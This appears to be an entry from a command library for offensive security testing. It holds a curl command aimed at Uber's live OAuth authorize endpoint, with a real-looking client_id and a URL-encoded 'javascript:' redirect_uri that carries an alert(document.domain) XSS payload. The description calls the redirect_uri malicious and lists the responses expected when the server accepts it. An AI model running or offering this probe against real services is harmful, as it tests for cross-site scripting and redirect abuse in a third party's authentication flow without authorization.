---
data: >-
  curl -i
  "https://login.uber.com/oauth/authorize?client_id=MXeE1dl-5R3yTCbufMHsfz3KhfY2UGyS&response_type=code&scope=profile&redirect_uri=javascript:%2F%2Fgoog.com%2F%250Aalert%28document.domain%29%3B%2F%2F"
tags:
  - web
  - oauth
  - test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:07.896Z'
id: 7eb994d5-bb24-4b8a-afa8-eebe25c4c021
verified: false
validated: true
submitted: true
---
# curl-oauth-access

## Command

```bash
curl -i "https://login.uber.com/oauth/authorize?client_id=MXeE1dl-5R3yTCbufMHsfz3KhfY2UGyS&response_type=code&scope=profile&redirect_uri=javascript:%2F%2Fgoog.com%2F%250Aalert%28document.domain%29%3B%2F%2F"
```

## Description

Use curl to access Uber's OAuth authorize endpoint with a malicious redirect_uri for initial verification of the response, such as checking for the consent page or redirect headers. Note: JS execution requires a browser; curl verifies server behavior.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers | Yes |
| URL | Full OAuth URL with params | Yes |

## Examples

### Basic Usage

```bash
curl -i "https://login.uber.com/oauth/authorize?client_id=EXAMPLE&response_type=code&redirect_uri=TEST"
```

### Advanced Usage

```bash
curl -i -L "https://login.uber.com/oauth/authorize?..." # Follow redirects if needed
```

## Expected Output

HTTP/1.1 200 OK or 302 with Location: javascript:... and HTML consent page in body.

## Related

- [[Related Procedure]]
